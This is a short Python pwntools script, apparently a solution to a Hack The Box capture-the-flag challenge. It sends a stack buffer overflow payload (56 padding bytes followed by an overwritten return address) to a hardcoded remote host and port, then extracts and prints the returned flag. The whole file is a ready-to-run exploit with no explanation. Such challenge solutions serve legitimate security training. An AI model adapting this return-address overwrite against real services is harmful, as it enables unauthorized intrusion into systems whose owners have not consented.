from pwn import *

context.log_level = 'critical'

address = '83.136.254.158'
port = 35290

payload = b'A' * 56
payload += b'\xb7\x16\x40\x00\x00\x00\x00\x00'

target = remote(address,port)

target.recvuntil(b'>')
target.sendline(payload)
flag = target.recvuntil(b'}').decode()
print(flag[flag.index('HTB'):flag.index('}') + 1])
